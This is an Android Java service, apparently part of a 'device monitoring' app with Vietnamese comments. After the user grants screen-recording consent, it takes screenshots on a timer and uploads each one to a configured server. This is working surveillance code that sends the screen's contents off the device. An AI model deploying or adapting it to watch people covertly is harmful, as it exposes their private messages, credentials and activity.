package com.example.devicemonitoring;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Surface;
import android.view.WindowManager;

import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ScreenshotService extends Service {
    private static final String TAG = "ScreenshotService";
    private static final String CHANNEL_ID = "ScreenshotServiceChannel";
    private static final int MAX_SCREENSHOTS = 10; // Số lượng ảnh tối đa
    private static final long CAPTURE_DELAY = Constants.TIMEOUT_SCREENSHOT;

    private MediaProjection mediaProjection;
    private ImageReader imageReader;
    private Handler handler;
    private int screenshotCount = 0; // Biến đếm số lượng ảnh đã lưu
    private String[] screenshotFiles = new String[MAX_SCREENSHOTS]; // Mảng lưu tên file ảnh

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, createNotification());
        handler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        int resultCode = intent.getIntExtra("resultCode", 0);
        Intent data = intent.getParcelableExtra("data");

        MediaProjectionManager mediaProjectionManager =
                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data);

        if (mediaProjection != null) {
            startScreenshot();
        } else {
            Log.e(TAG, "MediaProjection is null.");
            stopSelf();
        }

        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Screenshot Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Screenshot Service")
                .setContentText("Capturing screenshots")
                .setSmallIcon(R.drawable.ic_location) // Thay thế bằng biểu tượng của ứng dụng
                .build();
    }

    private void startScreenshot() {
        WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getRealMetrics(metrics);

        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        Surface surface = imageReader.getSurface();

        // Đăng ký callback
        mediaProjection.registerCallback(new MediaProjection.Callback() {
            @Override
            public void onStop() {
                super.onStop();
                Log.d(TAG, "MediaProjection stopped");
                if (imageReader != null) {
                    imageReader.close();
                    imageReader = null;
                }
                stopSelf();
            }
        }, handler);

        // Tạo virtual display
        mediaProjection.createVirtualDisplay(
                "ScreenCapture",
                width,
                height,
                density,
                0,
                surface,
                null,
                handler
        );

        // Đặt listener để chụp ảnh
        imageReader.setOnImageAvailableListener(reader -> {
            Image image = reader.acquireLatestImage();
            if (image != null) {
                saveAndUploadScreenshot(image, width, height);
                image.close();
            }

            // Tạo độ trễ trước khi chụp ảnh tiếp theo
            handler.postDelayed(this::captureNextScreenshot, CAPTURE_DELAY);
        }, handler);
    }

    private void captureNextScreenshot() {
        // Kiểm tra nếu ImageReader vẫn hoạt động
        if (imageReader != null) {
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                saveAndUploadScreenshot(image, image.getWidth(), image.getHeight());
                image.close();
            }

            // Tiếp tục tạo độ trễ cho lần chụp tiếp theo
            handler.postDelayed(this::captureNextScreenshot, CAPTURE_DELAY);
        }
    }

    private void saveAndUploadScreenshot(Image image, int width, int height) {
        Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
        bitmap.copyPixelsFromBuffer(buffer);

        // Tạo tên file ảnh
        String fileName = "screenshot_" + (screenshotCount % MAX_SCREENSHOTS) + ".png";
        File screenshotFile = new File(getExternalFilesDir(null), fileName);

        try (FileOutputStream fos = new FileOutputStream(screenshotFile)) {
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
            fos.flush();
            uploadScreenshot(screenshotFile);

            // Lưu tên file vào mảng
            screenshotFiles[screenshotCount % MAX_SCREENSHOTS] = fileName;
            screenshotCount++; // Tăng biến đếm

            Log.d(TAG, "Screenshot saved: " + fileName);
        } catch (Exception e) {
            Log.e(TAG, "Error saving screenshot: " + e.getMessage());
        }
    }

    private void uploadScreenshot(File file) {
        OkHttpClient client = new OkHttpClient();
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("image", file.getName(),
                        RequestBody.create(file, MediaType.parse("image/png")))
                .build();

        Request request = new Request.Builder()
                .url(Constants.SERVER_URL + "/upload") // Thay thế bằng URL server của bạn
                .post(requestBody)
                .build();

        new Thread(() -> {
            try (Response response = client.newCall(request).execute()) {
                if (!response.isSuccessful()) {
                    Log.e(TAG, "Upload failed: " + response.code());
                } else {
                    Log.d(TAG, "Upload successful!");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error uploading screenshot: " + e.getMessage());
            }
        }).start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
        if (handler != null) {
            handler.removeCallbacksAndMessages(null); // Dừng tất cả các tác vụ đang chờ
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}